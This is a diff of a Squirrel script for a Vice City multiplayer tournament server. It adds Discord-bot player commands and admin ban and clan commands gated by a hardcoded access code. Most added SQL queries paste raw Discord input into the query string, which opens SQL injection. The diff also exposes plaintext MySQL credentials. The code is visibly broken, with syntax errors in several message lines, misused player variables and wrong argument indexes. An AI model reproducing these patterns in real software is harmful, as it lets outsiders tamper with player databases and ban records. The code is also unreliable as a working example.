@@ -7,6 +7,7 @@ class PlayerStats
  AutoLogin = false;
  LoggedIn = false;
  Registered = false;
+ welcomescreen = false;
  banned = false;
  spawnwep = null;
  clan = null;
@@ -37,9 +38,9 @@ function onScriptLoad()
 {
  DB <- ConnectSQL("databases/Registration.db");
  status <- array(GetMaxPlayers(), null);
-// con <- mysql_connect( "localhost", "discordbot", "1234", "mydb");
-// if( con ) print( "[SERVER] Connection to mySQL database successful." );
-// QuerySQL(DB, "CREATE TABLE if not exists Accounts ( Name TEXT, LowerName TEXT, Password VARCHAR ( 255 ), Level NUMERIC DEFAULT 1, TimeRegistered VARCHAR ( 255 ) DEFAULT CURRENT_TIMESTAMP, UID VARCHAR ( 255 ), IP VARCHAR ( 255 ), AutoLogin BOOLEAN DEFAULT true, Banned TEXT, clan VARCHAR ( 255 ), Kills VARCHAR ( 255 ), Headshots VARCHAR ( 255 ), Deaths VARCHAR ( 255 ), lastjoined VARCHAR ( 255 ) ) ");
+ con <- mysql_connect( "localhost", "discordbot", "1234", "mydb");
+ if( con ) print( "[SERVER] Connection to mySQL database successful." );
+ QuerySQL(DB, "CREATE TABLE if not exists Accounts ( Name TEXT, LowerName TEXT, Password VARCHAR ( 255 ), Level NUMERIC DEFAULT 1, TimeRegistered VARCHAR ( 255 ) DEFAULT CURRENT_TIMESTAMP, UID VARCHAR ( 255 ), IP VARCHAR ( 255 ), AutoLogin BOOLEAN DEFAULT true, Banned TEXT, clan VARCHAR ( 255 ), Kills VARCHAR ( 255 ), Headshots VARCHAR ( 255 ), Deaths VARCHAR ( 255 ), lastjoined VARCHAR ( 255 ) ) ");
  QuerySQL(DB," create table if not exists kicked ( name VARCHAR ( 255 ), admin VARCHAR ( 255 ), date VARCHAR ( 255 ), reason VARCHAR ( 255 ) ) ");
  QuerySQL(DB," create table if not exists warn ( name VARCHAR ( 255 ), admin VARCHAR ( 255 ), date VARCHAR ( 255 ), reason VARCHAR ( 255 ) ) ");
  QuerySQL(DB," create table if not exists slap ( name VARCHAR ( 255 ), admin VARCHAR ( 255 ), date VARCHAR ( 255 ), reason VARCHAR ( 255 ) ) ");
@@ -68,9 +69,9 @@ function onScriptLoad()
     AddClass( 5, RGB( 211, 211, 211 ), 84, Vector( -657.091, 762.422, 11.5998 ), -3.13939, 21, 999 ,1, 1, 25, 255 );
     funmessages <- [ "Hey hey, hands up because it's ", "Yo, it's ", "Say what? It's ", "All hail ", "Give it up for ", "Hooray! We've ", "Well, well, well. Isn't it ", "Welcome to the party, ", "Greetings ", "Hellow " ];
 	GGlocs <- ["-128.821 488.705 13.4961", "-166.972 608.88 13.5054", "-240.9 552.673 13.9821", "-241.094 466.62 14.9759", "-187.274 447.715 13.9719", "-73.6621 512.677 11.8284", "-195.861 507.561 16.4494"];
-//	MakeTimer(this, loadid, 500, 1);
-//	MakeTimer(this, loaddid, 500, 1);
-//	MakeTimer(this, loadserverbot, 500, 0);
+	MakeTimer(this, loadid, 500, 1);
+	MakeTimer(this, loaddid, 500, 1);
+	MakeTimer(this, loadserverbot, 500, 0);
 
 
 
@@ -246,7 +247,7 @@ function Update()
 	{
 		if( pCamera[i] )
 		{
-			if( pCamera[i].IsEnabled() ) pCamera[i].Process();
+			if( pCamera[i].bEnabled ) pCamera[i].Process();
 		}
 	}
 }
@@ -289,21 +290,38 @@ function loadserverbot()
 			{
 				if( id.tointeger() < data["id"].tointeger() )
 				{
-					Message(bas+"[DISCORD] [#D3D3D3]"+data["name"]+white+": "+data["text"]);
-					botcommand(data["text"]);
 					id++;
-					print(id);
+					if(botcommand(data["text"], data["name"])) return;
+					else
+					{
+						if(data["text"] == "????") Message(bas+"[DISCORD] [#D3D3D3]"+data["name"]+white+": *Send Emoji*");
+						else Message(bas+"[DISCORD] [#D3D3D3]"+data["name"]+white+": "+data["text"]);
+					}
 				}
 			}
 		}
 	}
 }
 
-function botcommand(cmd)
+function botcommand(cmd, player)
 {
+	//player commands
 	if(cmd.slice(0,1) == "/")
 	{
-		if(cmd == "/players")
+		local arguments = GetTok(cmd, " ", 2, NumTok(cmd, " "));
+		if(cmd == "/help")
+		{
+			local p = "Use / (back slash) to use commands. Use /cmds for a list of commands.";
+			discordsendmsg("Server", p);
+			return 1;
+		}
+		else if(cmd == "/cmds")
+		{
+			local p = "List of Available Commands:				/players, /admins, /noobs";
+			discordsendmsg("Server", p);
+			return 1;
+		}
+		else if(cmd == "/players")
 		{
 			local a = 0;
 			for(local i = 0; i<= GetMaxPlayers();i++)
@@ -313,6 +331,7 @@ function botcommand(cmd)
 			}
 			local p = a+"/"+GetMaxPlayers()+" are online.";
 			discordsendmsg("Server", p);
+			return 1;
 		}
 		else if (  cmd == "/admin"  ||  cmd == "/admins"  )
 		{
@@ -345,8 +364,289 @@ function botcommand(cmd)
 				local p = "No Admins are online.";
 				discordsendmsg("Server", p);
 			}
+			return 1;
 		}
+		else if(cmd == "/noobs" || cmd == "/noob")
+		{
+			local plr = FindPlayer(FindRandPlayer());
+			local p = "Noob in the Server: "+plr.Name+".                  This is just a Joke.";
+			discordsendmsg("Server", p);
+			return 1;
+			
+		}
+		
+		//###############admins cmds
+		local acode = "yNwrZnjpzUGKzbqmsw3uTjvT3BEptcMV8TZ27X4maCHNRCcGWzC3bxVPrr9cC9AC3StekRhqUxSte5DS4ndfhrD5g5Tfna48";
+		if(cmd == acode+"/addclan")
+		{
+			if(!arguments || NumTok(arguments, " ") < 2) discordsendmsg("AServer", "Error: Use "+cmd+" <clan tag> <clan name>");
+			else
+			{
+				local q = QuerySQL(clan, "SELECT * FROM registered WHERE tag = '"+GetTok(arguments, " ", 1)+"'");
+				local q2 = QuerySQL(clan, "SELECT * FROM registered WHERE name = '"+GetTok(arguments, " ", 2, NumTok(arguments, " "))+"'");
+				if(q) discordsendmsg("AServer", "Clan with that tag already exists.");
+				else if(q2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Clan with that name already exists.", player);
+				else
+				{
+					QuerySQL(clan, "INSERT INTO registered (name, tag) VALUES ('"+GetTok(arguments, " ", 2, NumTok(arguments, " "))+"', '"+GetTok(arguments, " ", 1)+"') ");
+					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+bas+"Discord("+player+")[#FFFFFF] added: "+GetTok(arguments, " ", 2, NumTok(arguments, " "))+" in the clan tournament.");
+					local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
+					QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( 'Discord("+player+")',  '"+6+"', '"+ GetTok(arguments, " ", 2, NumTok(arguments, " ")) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );	
+				}
+			}
+			return 0;
+		}
+		else if(cmd == acode+"/removeclan")
+		{
+			if(!arguments) discordsendmsg("AServer", "Error: Use "+cmd+" <clan tag>");
+			else
+			{
+				local q = QuerySQL(clan, "SELECT * FROM registered WHERE tag = '"+GetTok(arguments, " ", 1)+"'");
+				if(!q) discordsendmsg("AServer", "Error: Clan does not exists.");
+				else
+				{
+					QuerySQL(DB, "UPDATE Accounts SET clan = null WHERE clan = '"+GetSQLColumnData(q, 0)+"'");
+					QuerySQL(clan, "DELETE FROM registered WHERE tag = '"+arguments+"'");
+					QuerySQL(clan, "DELETE FROM members WHERE tag = '"+arguments+"'");
+					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+bas+"Discord("+player+")[#FFFFFF] removed clan: "+GetSQLColumnData(q, 0)+" from the clan tournament.");
+					QuerySQL(clan, "INSERT INTO Registered ( Name, Tag ) VALUES ('"+GetTok(arguments, " ", 2, NumTok(arguments, " "))+"', '"+GetTok(arguments, " '", 1)+"') ");
+				}
+			}
+			return 0;
+		}
+		else if(cmd == acode+"/nameban")
+		{
+			if(!arguments || NumTok(arguments, " ") < 2) discordsendmsg("AServer", "Error: Use "+cmd+" <player> <reason>");
+			else
+			{
+				local now = date();
+				local dat = now.day + "/" + now.month + "/" + now.year + " " + now.hour + ":" + now.min + ":" + now.sec;
+				local plr = FindPlayer(GetTok(arguments, " ", 2));
+				if(plr)
+				{
+					QuerySQL(ban, "INSERT INTO nameban (name, admin, date, reason) VALUES ('"+escapeSQLString(plr.Name.tolower())+"', 'Discord("+player.tolower()+")', '"+dat+"', '"+GetTok(arguments, " ", 2, NumTok(arguments, " "))+"') ");
+					local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
+					if(q) QuerySQL(DB, "UPDATE Accounts SET banned = 'Yes' WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
+					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+bas+"Discord("+player"+)[#FFFFFF] Name-Banned player: "+pcol(plr.ID)+plr.Name+white+" Reason: "+GetTok(arguments, " ", 2, NumTok(arguments, " "))+".");
+					MessagePlayer("[#FFDD33]Information:[#FFFFFF] If you think that you are wrongfully banned, make an admin report on our forum: ", plr);
+					KickPlayer(plr);
+					local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
+					QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( 'Discord("+player.tolower()+")',  'Discord', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ GetTok( arguments, " ", 2, NumTok( arguments, " " ) ) +"' ) " );
+					discordsendmsg("AServer", plr.Name+" is Name-banned from server.");
+				}
+				else
+				{
+					QuerySQL(ban, "INSERT INTO nameban (name, admin, date, reason) VALUES ('"+escapeSQLString(GetTok(arguments, " ", 1).tolower())+"', 'Discord("+player.tolower()+")', '"+dat+"', '"+GetTok(arguments, " ", 2, NumTok(arguments, " "))+"') ");
+					local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
+					QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( 'Discord("+player.tolower()+")',  'Discord', '"+ escapeSQLString( GetTok( arguments, " ", 1 ) ) +"', '"+ dat +"', '"+ cmd +"', '"+ GetTok( arguments, " ", 2, NumTok( arguments, " " ) ) +"' ) " );
+					discordsendmsg("AServer", GetTok(arguments, " ", 2)+" is Name-banned from server.");
+					local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(GetTok(arguments, " ", 1).tolower())+"'");
+					if(q)
+					{
+						QuerySQL(DB, "UPDATE Accounts SET banned = 'Yes' WHERE LowerName = '"+escapeSQLString(GetTok(arguments, " ", 1).tolower())+"'");
+						Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+bas+"Discord("+player+")[#FFFFFF] Name-Banned player: [#D3D3D3]"+GetSQLColumnData(q, 0)+white+" Reason: "+GetTok(arguments, " ", 2, NumTok(arguments, " "))+".");
+					}
+					else Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+bas+"Discord("+player+")[#FFFFFF] Name-Banned player: [#D3D3D3]"+GetTok(arguments, " ", 1)+white+" Reason: "+GetTok(arguments, " ", 2, NumTok(arguments, " "))+".");
+				}
+			}
+		}
+	
+		else if(cmd == acode+"/permaban")
+		{
+			if(!arguments || NumTok(arguments, " ") < 2) discordsendmsg("AServer", "Error: Use "+cmd+" <player> <reason>");
+			else
+			{
+				local now = date();
+				local dat = now.day + "/" + now.month + "/" + now.year + " " + now.hour + ":" + now.min + ":" + now.sec;
+				local plr = FindPlayer(GetTok(arguments, " ", 2));
+				if(plr)
+				{
+					QuerySQL(ban, "INSERT INTO permaban (name, admin, date, UID, reason) VALUES ('"+escapeSQLString(plr.Name.tolower())+"', 'Discord("+player.tolower()+")', '"+dat+"', '"+plr.UID+"', '"+GetTok(arguments, " ", 2, NumTok(arguments, " "))+"') ");
+					local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
+					if(q) QuerySQL(DB, "UPDATE Accounts SET banned = 'Yes' WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
+					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+bas+"Discord("+player+")[#FFFFFF] Permanently Banned player: "+pcol(plr.ID)+plr.Name+white+" Reason: "+GetTok(arguments, " ", 2, NumTok(arguments, " "))+".");
+					MessagePlayer("[#FFDD33]Information:[#FFFFFF] If you think that you are wrongfully banned, make an admin report on our forum: ", plr);
+					local uid = plr.UID;
+					KickPlayer(plr);
+					for(local i=0; i<=GetMaxPlayers(); i++)
+					{
+						local plar = FindPlayer(i);
+						if(plar && plar.UID == uid) KickPlayer(plar);
+					}
+					local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
+					QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( 'Discord("+player.tolower()+")',  'Discord', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ GetTok( arguments, " ", 2, NumTok( arguments, " " ) ) +"' ) " );
+					discordsendmsg("AServer", plr.Name+" is Perma-banned from server.");
+				}
+				else
+				{
+					local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(GetTok(arguments, " ", 2).tolower())+"'");
+					if(q)
+					{
+						QuerySQL(ban, "INSERT INTO permaban (name, admin, date, UID, reason) VALUES ('"+escapeSQLString(GetSQLColumnData(q, 1).tolower())+"', 'Discord("+player.tolower()+")', '"+dat+"', '"+GetSQLColumnData(q, 5)+"', '"+GetTok(arguments, " ", 2, NumTok(arguments, " "))+"') ");
+						QuerySQL(DB, "UPDATE Accounts SET banned = 'Yes' WHERE LowerName = '"+escapeSQLString(GetSQLColumnData(q, 1).tolower())+"'");
+						Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+bas+"Discord("+player+")[#FFFFFF] Permanently Banned player: [#D3D3D3]"+GetSQLColumnData(q, 0)+" Reason: "+GetTok(arguments, " ", 2, NumTok(arguments, " "))+".");
+						QuerySQL(DB, "UPDATE Accounts SET banned = 'Yes' WHERE LowerName = '"+escapeSQLString(GetTok(arguments, " ", 1).tolower())+"'");
+						local uid = GetSQLColumnData(q, 6);
+						for(local i=0; i<=GetMaxPlayers(); i++)
+						{
+							local plar = FindPlayer(i);
+							if(plar && plar.UID == uid) KickPlayer(plar);
+						}
+						local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
+						QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( 'Discord("+player.tolower()+")',  'Discord', '"+ escapeSQLString( GetTok( arguments, " ", 1 ) ) +"', '"+ dat +"', '"+ cmd +"', '"+ GetTok( arguments, " ", 2, NumTok( arguments, " " ) ) +"' ) " );				
+					}
+					else
+					{
+						local q2 = QuerySQL(DB, "SELECT * FROM Unregistered WHERE LowerName = '"+escapeSQLString(GetTok(arguments, " ", 2).tolower())+"'");
+						if(!q2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
+						else
+						{
+							QuerySQL(ban, "INSERT INTO permaban (name, admin, date, UID, reason) VALUES ('"+escapeSQLString(GetSQLColumnData(q2, 1).tolower())+"', 'Discord("+player.tolower()+")', '"+dat+"', '"+GetSQLColumnData(q, 5)+"', '"+GetTok(arguments, " ", 2, NumTok(arguments, " "))+"') ");
+							MessagePlayer("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+bas+"Discord("+player"+)[#FFFFFF] Permanently Banned player: [#D3D3D3]"+GetSQLColumnData(q, 0)+" Reason: "+GetTok(arguments, " ", 2, NumTok(arguments, " "))+".", player);
+							local uid = GetSQLColumnData(q, 6);
+							for(local i=0; i<=GetMaxPlayers(); i++)
+							{
+								local plar = FindPlayer(i);
+								if(plar && plar.UID == uid) KickPlayer(plar);
+							}
+							local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
+							QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( 'Discord("+player.tolower()+")',  'Discord', '"+ escapeSQLString( GetTok( arguments, " ", 1 ) ) +"', '"+ dat +"', '"+ cmd +"', '"+ GetTok( arguments, " ", 2, NumTok( arguments, " " ) ) +"' ) " );				
+						}
+					}
+					discordsendmsg("AServer", GetTok(arguments, " ", 2)+" is Perma-banned from server.");
+				}
+			}
+		}
+		else if(cmd == acode+"/tempban")
+		{
+			if(!arguments || NumTok(arguments, " ") < 3) discordsendmsg("AServer", "Error: Use "+cmd+" <player> <days 1 - 100> <reason>");
+			else if(!IsNum(GetTok(arguments, " ", 2)) || GetTok(arguments, " ", 2).tointeger() < 0 || GetTok(arguments, " ", 2).tointeger() > 100) discordsendmsg("AServer", "Error: Days should be in numbers and between 1 to 100.");
+			else
+			{
+				local now = date();
+				local dat = now.day + "/" + now.month + "/" + now.year + " " + now.hour + ":" + now.min + ":" + now.sec;
+				local plr = FindPlayer(GetTok(arguments, " ", 1));
+				if(plr)
+				{
+					QuerySQL(ban, "INSERT INTO tempban (name, admin, date, UID, duration, expire, reason) VALUES ('"+escapeSQLString(plr.Name.tolower())+"', 'Discord("+player.tolower()+")', '"+dat+"', '"+plr.UID+"', '"+GetTok(arguments, " ", 2)+"', '"+addbantime(GetTok(arguments, " ", 2).tointeger())+"', '"+GetTok(arguments, " ", 3, NumTok(arguments, " "))+"') ");
+					local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
+					if(q) 
+					QuerySQL(DB, "UPDATE Accounts SET banned = 'Yes' WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
+					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+bas+"Discord("+player"+)[#FFFFFF] Banned player: "+pcol(plr.ID)+plr.Name+white+" for: "+GetTok(arguments, " ", 2)+" days Reason: "+GetTok(arguments, " ", 3, NumTok(arguments, " "))+".");
+					MessagePlayer("[#FFDD33]Information:[#FFFFFF] If you think that you are wrongfully banned, make an admin report on our forum: ", plr);
+					local uid = plr.UID;
+					KickPlayer(plr);
+					local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
+					discordsendmsg("AServer", plr.Name+" is Temp-banned from server. for "+GetTok(arguments, " ", 2)+"");
+					QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( 'Discord("+player.tolower()+")',  'Discord', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ GetTok( arguments, " ", 3, NumTok( arguments, " " ) ) +"' ) " );
+					for(local i=0; i<=GetMaxPlayers(); i++)
+					{
+						local plar = FindPlayer(i);
+						if(plar && plar.UID == uid) KickPlayer(plar);
+					}
+				}
+				else
+				{
+					local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(GetTok(arguments, " ", 2).tolower())+"'");
+					if(q)
+					{
+						QuerySQL(ban, "INSERT INTO tempban (name, admin, date, UID, duration, expire, reason) VALUES ('"+escapeSQLString(GetTok(arguments, " ", 2).tolower())+"', 'Discord("+player.tolower()+")', '"+dat+"', '"+GetSQLColumnData(q, 6)+"', '"+GetTok(arguments, " ", 2)+"', '"+addbantime(GetTok(arguments, " ", 2).tointeger())+"', '"+GetTok(arguments, " ", 3, NumTok(arguments, " "))+"') ");
+						QuerySQL(DB, "UPDATE Accounts SET banned = 'Yes' WHERE LowerName = '"+escapeSQLString(GetTok(arguments, " ", 1).tolower())+"'");
+						Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+bas+"Discord("+player"+)[#FFFFFF] Banned player: [#D3D3D3]"+GetSQLColumnData(q, 0)+white+" for: "+GetTok(arguments, " ", 2)+" days Reason: "+GetTok(arguments, " ", 2, NumTok(arguments, " "))+".");
+						local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
+						QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( 'Discord("+player.tolower()+")',  'Discord', '"+ GetSQLColumnData(q2, 0) +"', '"+ dat +"', '"+ cmd +"', '"+ GetTok( arguments, " ", 3, NumTok( arguments, " " ) ) +"' ) " );
+						local uid = GetSQLColumnData(q, 6);
+						for(local i=0; i<=GetMaxPlayers(); i++)
+						{
+							local plar = FindPlayer(i);
+							if(plar && plar.UID == uid) KickPlayer(plar);
+						}
+					}
+					else
+					{
+						local q2 = QuerySQL(DB, "SELECT * FROM Unregistered WHERE LowerName = '"+escapeSQLString(GetTok(arguments, " ", 2).tolower())+"'");
+						if(!q2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
+						else
+						{
+							QuerySQL(ban, "INSERT INTO tempban (name, admin, date, UID, duration, expire, reason) VALUES ('"+escapeSQLString(GetTok(arguments, " ", 2).tolower())+"', 'Discord("+player.tolower()+")', '"+dat+"', '"+GetSQLColumnData(q, 5)+"', '"+GetTok(arguments, " ", 2)+"', '"+addbantime(GetTok(arguments, " ", 2).tointeger())+"', '"+GetTok(arguments, " ", 3, NumTok(arguments, " "))+"') ");
+							Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+bas+"Discord("+player"+)[#FFFFFF] Banned player: [#D3D3D3]"+GetSQLColumnData(q, 0)+white+" for: "+GetTok(arguments, " ", 2)+" days Reason: "+GetTok(arguments, " ", 2, NumTok(arguments, " "))+".");
+							local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
+							QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( 'Discord("+player.tolower()+")',  'Discord', '"+ GetSQLColumnData(q2, 0) +"', '"+ dat +"', '"+ cmd +"', '"+ GetTok( arguments, " ", 3, NumTok( arguments, " " ) ) +"' ) " );
+							local uid = GetSQLColumnData(q2, 2);
+							for(local i=0; i<=GetMaxPlayers(); i++)
+							{
+								local plar = FindPlayer(i);
+								if(plar && plar.UID == uid) KickPlayer(plar);
+							}
+						}
+					}
+					discordsendmsg("AServer", GetTok(arguments, " ", 2)+" is Temp-banned from server for "+GetTok(arguments, " ", 2)+" days.");
+				}
+			}
+		}
+	
+		else if(cmd == acode+"/permaunban")
+		{
+			if(!arguments) discordsendmsg("AServer", "Error: Use "+cmd+" <player>");
+			else
+			{
+				local q = QuerySQL(ban, "SELECT * FROM permaban WHERE name = '"+escapeSQLString(arguments.tolower())+"'");
+				if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
+				else
+				{
+					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+bas+"Discord("+player"+)[#FFFFFF] unbanned player: "+GetSQLColumnData(q, 0)+"'");
+					QuerySQL(ban, "INSERT INTO permaunban (name, badmin, admin, date, breason) VALUES ('"+GetSQLColumnData(q, 0)+"', '"+GetSQLColumnData(q, 1)+"', 'Discord("+player.tolower()+")', '"+GetSQLColumnData(q, 2)+"', '"+GetSQLColumnData(q, 4)+"') ");
+					QuerySQL(ban, "DELETE FROM permaban WHERE name = '"+escapeSQLString(arguments.tolower())+"'");
+					if(q) QuerySQL(DB, "UPDATE Accounts SET Banned = 'No' WHERE LowerName = '"+escapeSQLString(arguments.tolower())+"'");
+					local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
+					QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( 'Discord("+player.tolower()+")',  'Discord', '"+ GetSQLColumnData(q, 0) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );
+					discordsendmsg("AServer", GetTok(arguments, " ", 2)+" is Unbanned from server.");
+				}
+			}
+		}
+		
+		else if(cmd == acode+"/tempunban")
+		{
+			if(!arguments) discordsendmsg("AServer", "Error: Use "+cmd+" <player>");
+			else
+			{
+				local q = QuerySQL(ban, "SELECT * FROM permaban WHERE name = '"+escapeSQLString(arguments.tolower())+"'");
+				if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
+				else
+				{
+					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+bas+"Discord("+player"+)[#FFFFFF] unbanned player: "+GetSQLColumnData(q, 0)+"'");
+					QuerySQL(ban, "INSERT INTO temunbanned (name, badmin, admin, duration, date, breason) VALUES ('"+GetSQLColumnData(q, 0)+"', '"+GetSQLColumnData(q, 1)+"', 'Discord("+player.tolower()+")', '"+GetSQLColumnData(q, 4)+"', '"+GetSQLColumnData(q, 2)+"', '"+GetSQLColumnData(q, 6)+"') ");
+					QuerySQL(ban, "DELETE FROM tempban WHERE name = '"+escapeSQLString(arguments.tolower())+"'");
+					if(q) QuerySQL(DB, "UPDATE Accounts SET Banned = 'No' WHERE LowerName = '"+escapeSQLString(arguments.tolower())+"'");
+					local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
+					QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( 'Discord("+player.tolower()+")',  'Discord', '"+ GetSQLColumnData(q, 0) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );
+					discordsendmsg("AServer", GetTok(arguments, " ", 2)+" is Unbanned from server.");
+				}
+			}
+		}
+		
+		else if(cmd == acode+"/nameunban")
+		{
+			if(!arguments) discordsendmsg("AServer", "Error: Use "+cmd+" <player>");
+			else
+			{
+				local q = QuerySQL(ban, "SELECT * FROM nameban WHERE name = '"+escapeSQLString(arguments.tolower())+"'");
+				if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
+				else
+				{
+					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+bas+"Discord("+player"+)[#FFFFFF] name-unbanned player: [#D3D3D3]"+GetSQLColumnData(q, 0)+white+".");
+					QuerySQL(ban, "INSERT INTO nameunban (name, badmin, admin, date, breason) VALUES ('"+GetSQLColumnData(q, 0)+"', '"+GetSQLColumnData(q, 1)+"', '"+player.Name+"', '"+GetSQLColumnData(q, 2)+"', '"+GetSQLColumnData(q, 3)+"') ");
+					QuerySQL(ban, "DELETE FROM nameban WHERE name = '"+escapeSQLString(arguments.tolower())+"'");
+					QuerySQL(DB, "UPDATE Accounts SET Banned = 'No' WHERE LowerName = '"+escapeSQLString(arguments.tolower())+"'");
+					local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
+					QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( 'Discord("+player.tolower()+")'  'Discord', '"+ GetSQLColumnData(q, 0) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );
+					discordsendmsg("AServer", GetTok(arguments, " ", 2)+" is Unbanned from server.");
+				}
+			}
+		}
+		else return 0;
 	}
+	else return 1;
 }
 function discordsendmsg(player, text)
 {
@@ -355,15 +655,18 @@ function discordsendmsg(player, text)
 }
 function onPlayerJoin( player )
 {
+	status[player.ID] = PlayerStats();
+	AccInfo(player);
+	local a,b,c;
+	if(status[player.ID].Registered) a = 1; else a = 0;
+	if(status[player.ID].LoggedIn == true) b = 1; else b = 0;
+	c = player.Name+" "+a+" "+b+" "+status[player.ID].pass;
+	MakeTimer(this, SendDataToClient, 200, 1, player, 10, c);
     local FN = funmessages[ rand() % funmessages.len() ];
     Message( "[#FFDD33][Info][#FFFFFF] "+ FN + player.Name +"." );
-	status[player.ID] = PlayerStats();
-	pCamera[ player.ID ] = CCamera();
-	pCamera[ player.ID ].Player = FindPlayer( player.ID );
-	checkban(player)
-	AccInfo(player);
 	pCamera[ player.ID ] = CCamera();  
 	pCamera[ player.ID ].Player = FindPlayer( player.ID );
+	checkban(player);
 	MessagePlayer("[#FFDD33]Information:[#FFFFFF] Level: "+status[player.ID].Level+" ("+checklvl(status[player.ID].Level)+")", player);
 
 }
@@ -439,24 +742,14 @@ function AccInfo(player)
 		{
 			if (status[player.ID].AutoLogin == "true")
 			{
+				status[player.ID].LoggedIn = true;
 				MessagePlayer("[#FFDD33] Welcome to the [#FFFF00]VCMP Clan Tournament 2018[#FFFFFF].", player);
+				MessagePlayer("[#FFDD33] Use /credits to see the creators of the Server[#FFFFFF].", player);
 				if(status[player.ID].clan != null)
 				{
 					MessagePlayer("[#FFDD33] Clan : "+status[player.ID].clan+".", player);
 				}
-				MessagePlayer("[#FFDD33]Information:[#FFFFFF]  You've been auto logged in, to disable this, type /"+bas+"autologin"+white+" [ Toggles automatically ]", player);
-				status[player.ID].LoggedIn = true;
 			}
-			else
-			{
-				MessagePlayer("[#FFDD33] Welcome to the [#FFFF00]VCMP Clan Tournament 2018[#FFFFFF].", player);
-				MessagePlayer("[#FFDD33]Information:[#FFFFFF]  Your nick is registered. Please login in order to access services.", player);
-			}
-		}
-		else
-		{
-			MessagePlayer("[#FFDD33] Welcome to the [#FFFF00]VCMP Clan Tournament 2018[#FFFFFF].", player);
-			MessagePlayer("[#FFDD33]Information:[#FFFFFF]  Your nick is registered. Please login in order to access services.", player);
 		}
 	}
 }
@@ -502,69 +795,77 @@ function onPlayerPart( player, reason )
         break;
       }
     }
-    if ( status[ player.ID ].LoggedIn == true ) QuerySQL( DB, "UPDATE Accounts SET Level = '"+ status[ player.ID ].Level +"', IP = '"+ status[ player.ID ].IP +"', UID = '"+ status[ player.ID ].UID +"', Kills = '"+ status[ player.ID ].kills +"', Deaths = '"+ status[ player.ID ].deaths +"' WHERE Name LIKE '"+ player.Name +"'" );
+//    if ( status[ player.ID ].LoggedIn == true ) QuerySQL( DB, "UPDATE Accounts SET Level = '"+ status[ player.ID ].Level +"', IP = '"+ status[ player.ID ].IP +"', UID = '"+ status[ player.ID ].UID +"', Kills = '"+ status[ player.ID ].kills +"', Deaths = '"+ status[ player.ID ].deaths +"' WHERE Name LIKE '"+ player.Name +"'" );
     status[ player.ID ] = null;
 }
 
-function onPlayerRequestClass( player, classID, team, skin )
